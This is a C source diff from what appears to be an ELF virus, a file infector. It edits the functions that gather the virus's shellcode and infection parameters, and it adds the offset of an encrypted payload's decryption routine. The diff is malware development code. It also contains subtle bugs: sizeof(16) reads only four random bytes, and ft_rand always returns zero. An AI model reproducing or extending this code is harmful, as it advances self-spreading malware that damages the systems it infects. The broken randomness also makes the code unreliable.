@@ -13,14 +13,20 @@ int usage(char *name){
 	return -1;
 }
 
-int randomize(char *k){
+int randomize(char k[16]){
 	int             fd;
 
 	if ((fd = ft_open("/dev/urandom", 0, 0)) == -1)
 		return FALSE;
-	ft_read(fd, (char *)k, sizeof(*k)*16);
+	ft_read(fd, (char *)k, sizeof(16));
 	ft_close(fd);
 	return TRUE;
+}
+
+uint32_t ft_rand(){
+	char k[16];
+	randomize(k);
+	return 0;//((uint32_t*)k)[0];
 }
 
 int get_virus_info(InfectParams *p){
@@ -50,7 +56,13 @@ int get_virus_info(InfectParams *p){
 	c_len = c_len-c_off;
 	c_off -= bin_start_off; 
 
-	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len};
+	int64_t decrypt_routine_off;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "DECRYPT_ROUTINE", (int64_t*)&decrypt_routine_off);
+	decrypt_routine_off -= bin_start_off; 
+
+	debug_ext("dec:", decrypt_routine_off, "nm:", decrypt_routine_off+0x100, "\n");
+	void *x = ft_malloc_x(136);
+	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x};
 	return TRUE;
 }
 
